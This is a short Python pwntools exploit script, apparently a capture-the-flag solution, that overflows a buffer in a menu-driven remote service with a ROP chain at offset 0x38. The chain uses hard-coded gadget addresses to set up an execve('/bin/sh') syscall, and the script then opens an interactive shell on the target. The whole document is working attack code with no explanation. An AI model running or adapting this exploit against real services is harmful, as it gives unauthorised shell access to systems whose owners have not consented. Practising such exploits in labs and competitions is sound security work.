from pwn import *

pop_rax_ret = 0x000000000042adab
pop_rdi_pop_rbp_ret = 0x0000000000402bd8
pop_rsi_pop_rbp_ret = 0x000000000040c002 
bin_sh = 0x481778
pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0x000000000046f4dc
syscall = 0x000000000040141a 

'''
rax |            |          rdi         |           rsi            |          rdx
59  | sys_execve | const char *filename | const char *const argv[] | const char *const envp[]
'''

payload = flat({ 
  0x38: p64(pop_rdi_pop_rbp_ret) + p64(bin_sh) + p64(0) + 
        p64(pop_rsi_pop_rbp_ret) + p64(0)*2 +
        p64(pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret) + p64(0)*5 +
        p64(pop_rax_ret) + p64(0x3b) +
        p64(syscall)
})

r = remote(*(sys.argv[1].split(":")))

r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"(y/n):")
r.sendline(b"y")
r.recvuntil(b"buffer:")
r.sendline(payload)

r.interactive()